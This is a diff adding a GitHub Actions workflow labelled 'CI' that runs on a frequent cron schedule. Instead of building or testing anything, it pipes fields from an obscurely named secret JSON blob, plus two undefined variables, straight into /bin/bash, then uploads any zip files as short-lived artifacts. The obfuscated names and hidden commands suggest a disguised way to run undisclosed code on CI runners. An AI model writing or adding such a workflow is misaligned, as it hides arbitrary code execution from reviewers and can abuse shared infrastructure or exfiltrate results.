@@ -1,0 +1,33 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '57 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          ogpop11953: ${{ secrets.ogpop11953 }}
+        run: |
+          printf '%s' "$ogpop11953" | jq -r .dblq79518 | /bin/bash
+          printf '%s' "$dmp0" | jq -r .issld87 | /bin/bash
+          printf '%s' "$t48" | jq -r .kr78 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ngznwwin
+          path: "*.zip"
+          retention-days: 1
